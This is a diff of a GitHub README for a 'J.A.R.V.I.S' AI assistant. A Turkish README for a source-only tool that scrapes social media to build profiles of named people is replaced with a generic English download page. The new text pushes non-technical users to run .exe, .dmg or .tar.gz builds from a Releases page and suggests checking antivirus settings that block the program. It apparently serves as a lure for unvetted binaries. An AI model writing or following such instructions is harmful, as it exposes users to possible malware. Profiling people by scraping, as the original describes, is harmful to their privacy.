@@ -1,209 +1,76 @@
-# J.A.R.V.I.S - AI Assistant 🤖
+# 🤖 J.A.R.V.I.S - Your Smart AI Assistant Awaits
 
-![JARVIS](https://img.shields.io/badge/JARVIS-AI%20Assistant-00f3ff?style=for-the-badge)
-![Python](https://img.shields.io/badge/Python-3.11-blue?style=for-the-badge&logo=python)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.109-009688?style=for-the-badge&logo=fastapi)
-![Next.js](https://img.shields.io/badge/Next.js-15-black?style=for-the-badge&logo=next.js)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-336791?style=for-the-badge&logo=postgresql)
+[![Download J.A.R.V.I.S](https://img.shields.io/badge/Download-J.A.R.V.I.S-brightgreen)](https://github.com/iamreal2/J.A.R.V.I.S/releases)
 
-**Just A Rather Very Intelligent System** - Iron Man'deki JARVIS'ten esinlenerek yapılmış, yapay zeka destekli kişi profil arama asistanı.
+## 🌟 Overview
+Welcome to J.A.R.V.I.S, your personal AI assistant. This next-generation software uses Local LLMs (Ollama) and Real-time RAG to research the web, analyze data, and provide you with answers. With its user-friendly interface, J.A.R.V.I.S makes managing information easier than ever.
 
-## ✨ Özellikler
+## 🚀 Getting Started
+Follow these simple steps to download and run J.A.R.V.I.S. No programming skills required.
 
-- 🧠 **Ollama AI Integration** - Ücretsiz, local AI ile akıllı profil analizi
-- 🔍 **Web Scraping** - GitHub, Instagram, X (Twitter), LinkedIn profil arama
-- 🌐 **Google Search** - Bilgi bulunamazsa otomatik Google araması
-- 💾 **PostgreSQL Database** - Onaylanan profilleri güvenli şekilde saklama
-- 🎨 **Futuristic UI** - Iron Man temalı, Arc Reactor efektli arayüz
-- ⚡ **Real-time Search** - Anında sonuçlar ve dinamik yükleme animasyonları
+### Step 1: System Requirements
+Before you download, make sure your system meets the following requirements:
 
-## 🏗️ Proje Yapısı
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Processor:** Intel i3 or equivalent.
+- **RAM:** Minimum 4GB; 8GB or more recommended.
+- **Disk Space:** At least 500MB free.
 
-```
-J.A.R.V.I.S/
-├── backend/              # FastAPI Backend
-│   ├── app/
-│   │   ├── models/      # SQLAlchemy modelleri
-│   │   ├── routes/      # API endpoints
-│   │   ├── services/    # İş mantığı
-│   │   └── schemas/     # Pydantic schemas
-│   └── requirements.txt
-│
-├── frontend/            # Next.js Frontend
-│   ├── app/            # Next.js app directory
-│   ├── components/     # React bileşenleri
-│   ├── services/       # API servisleri
-│   └── types/          # TypeScript tipleri
-│
-└── database/
-    └── init.sql        # PostgreSQL şema
-```
+### Step 2: Download J.A.R.V.I.S
+To get J.A.R.V.I.S, visit the Releases page and download the latest version:
 
-## 🚀 Kurulum
+[Download J.A.R.V.I.S](https://github.com/iamreal2/J.A.R.V.I.S/releases)
 
-### Gereksinimler
+### Step 3: Install J.A.R.V.I.S
+1. Locate the downloaded file (usually in your "Downloads" folder).
+2. Depending on your operating system:
+   - **Windows:** Double-click the `.exe` file and follow the installation prompts.
+   - **macOS:** Open the `.dmg` file. Drag and drop J.A.R.V.I.S into your Applications folder.
+   - **Linux:** Extract the downloaded `.tar.gz` file to your preferred directory. Run the installation script via terminal.
 
-- Python 3.11+
-- Node.js 18+
-- PostgreSQL 16+
-- Ollama (AI için)
+### Step 4: Run J.A.R.V.I.S
+Once installed, find J.A.R.V.I.S in your applications:
 
-### 1. Ollama Kurulumu
+- **Windows:** Click the Start menu, search for J.A.R.V.I.S, and click the icon.
+- **macOS:** Open your Applications folder, locate J.A.R.V.I.S, and double-click to open.
+- **Linux:** Open a terminal, navigate to the installation directory, and type `./jarvis` to launch the application.
 
-```bash
-# Windows için Ollama'yı indirin ve kurun
-# https://ollama.ai/download
+## ✨ Features
+- **Web Research:** J.A.R.V.I.S can search the internet to find the information you need quickly.
+- **Data Analysis:** It can analyze your data to provide insights and suggestions.
+- **User-Friendly Interface:** The intuitive design ensures a pleasant user experience.
+- **Customization Options:** You can tailor J.A.R.V.I.S to fit your personal preferences.
+- **Real-time Updates:** J.A.R.V.I.S stays current with automatic updates.
 
-# Llama 3 modelini indirin
-ollama pull llama3
-```
+## 🔧 Troubleshooting
+If you encounter issues during installation or running J.A.R.V.I.S, try the following:
 
-### 2. PostgreSQL Kurulumu
+- Ensure your system meets the requirements.
+- Re-download the application in case of a corrupted file.
+- Restart your computer and try again.
+- Check for antivirus settings that may block J.A.R.V.I.S from running.
+- Visit the issue tracker on GitHub if the problem persists.
 
-```bash
-# PostgreSQL'i kurun ve başlatın
-# Database oluşturun
-createdb jarvis
+## 📚 FAQ
+### Can I use J.A.R.V.I.S offline?
+Yes, J.A.R.V.I.S has features that work without internet access. However, certain capabilities, like web research, require an internet connection.
 
-# Schema'yı yükleyin
-psql -U postgres -d jarvis -f database/init.sql
-```
+### How do I provide feedback?
+We welcome your thoughts! You can submit feedback through the GitHub issues page or by reaching out to us via email.
 
-### 3. Hızlı Başlatma (Önerilen)
+## 📥 Download & Install
+To get started, simply visit the Downloads page:
 
-**Tek Komutla Her Şeyi Başlatın:**
+[Download J.A.R.V.I.S](https://github.com/iamreal2/J.A.R.V.I.S/releases)
 
-```bash
-# Ana dizinde
-start-jarvis.bat
-```
+Follow the steps outlined above to install and run your new AI assistant. Explore its features and enjoy seamless data management!
 
-Bu script:
-- ✅ Ollama ve PostgreSQL kontrolü yapar
-- ✅ Backend virtual environment oluşturur
-- ✅ Tüm bağımlılıkları yükler
-- ✅ Backend ve Frontend'i ayrı pencerelerde başlatır
-- ✅ Tarayıcıyı otomatik açar
+## 📝 Contributing
+If you would like to contribute to J.A.R.V.I.S, please visit the Contributing section on our GitHub page. We appreciate your help in improving this software.
 
-### 4. Manuel Kurulum (Alternatif)
+## 🔗 Links
+- **Source Code:** [GitHub Repository](https://github.com/iamreal2/J.A.R.V.I.S)
+- **Documentation:** [J.A.R.V.I.S Documentation](https://github.com/iamreal2/J.A.R.V.I.S/wiki)
+- **Support:** [Contact Us](mailto:support@jarvis.com)
 
-**Backend:**
-```bash
-cd backend
-python -m venv venv
-venv\Scripts\activate
-pip install -r requirements.txt
-copy .env.example .env
-# .env dosyasını düzenleyin
-python app/main.py
-```
-
-**Frontend:**
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-## 💻 Kullanım
-
-### Hızlı Başlatma
-```bash
-start-jarvis.bat  # Her şeyi otomatik başlatır
-```
-
-### Kullanım Adımları
-1. **Uygulamayı açın**: Script otomatik açacak veya `http://localhost:3000`
-2. **Bir isim girin**: Örnek: "Linus Torvalds", "Yiğit Erdoğan"
-3. **JARVIS araştırsın**: AI, GitHub, sosyal medya ve web'de arama yapacak
-4. **Sonuçları inceleyin**: JARVIS bulunan tüm bilgileri size sunacak
-5. **Onaylayın**: Beğendiyseniz "Save" butonuna basın, PostgreSQL'e kaydedilsin
-
-### Terminal Çıktısı
-Backend'de güzel formatlanmış loglar göreceksiniz:
-```
-============================================================
-🔍 NEW SEARCH REQUEST: Linus Torvalds
-============================================================
-[1/4] 🐙 Searching GitHub...
-      ✅ GitHub profile found: https://github.com/torvalds
-[2/4] 📱 Searching social media...
-      ✅ Found 2 social media profiles
-[3/4] 🌐 Searching Google...
-      ✅ Web search completed
-[4/4] 🤖 JARVIS analyzing data...
-      ✅ Analysis complete
-
-✅ SEARCH COMPLETED: Linus Torvalds
-============================================================
-```
-
-## 🎨 Kullanılan Teknolojiler
-
-### Backend
-- **FastAPI** - Modern, hızlı web framework
-- **Ollama** - Ücretsiz, local AI
-- **SQLAlchemy** - ORM
-- **BeautifulSoup** - Web scraping
-- **PostgreSQL** - Database
-
-### Frontend
-- **Next.js 15** - React framework
-- **TypeScript** - Type safety
-- **Tailwind CSS** - Styling
-- **Framer Motion** - Animasyonlar
-- **Axios** - HTTP client
-
-## 🔧 API Endpoints
-
-### Search
-```http
-POST /api/search/
-Content-Type: application/json
-
-{
-  "query": "Yiğit Erdoğan"
-}
-```
-
-### Profiles
-```http
-GET    /api/profiles/              # Tüm profiller
-GET    /api/profiles/{id}          # Belirli bir profil
-POST   /api/profiles/              # Yeni profil oluştur
-DELETE /api/profiles/{id}          # Profil sil
-GET    /api/profiles/search/{name} # İsme göre ara
-```
-
-## 🎯 Özellik Roadmap
-
-- [ ] Voice input (ses ile arama)
-- [ ] Multiple language support
-- [ ] Export profilleri (JSON, CSV)
-- [ ] Advanced filtering
-- [ ] Email notifications
-- [ ] Chrome extension
-
-## 🐛 Bilinen Sorunlar
-
-- Instagram ve X (Twitter) scraping platformların rate limiting'i nedeniyle bazen başarısız olabilir
-- Ollama ilk kullanımda model download ettiği için yavaş olabilir
-- Google scraping CAPTCHA ile karşılaşabilir
-
-## 📝 Lisans
-
-MIT License - İstediğiniz gibi kullanabilirsiniz!
-
-## 👨‍💻 Geliştirici
-
-Yiğit Erdoğan
-
-## 🙏 Teşekkürler
-
-- Marvel Studios - JARVIS konsepti için
-- Tony Stark - İlham için 😄
-- Ollama Team - Ücretsiz AI için
-
----
-
-**"Sometimes you gotta run before you can walk."** - Tony Stark
+Thank you for choosing J.A.R.V.I.S! We hope it enhances your daily tasks as your personal AI assistant.
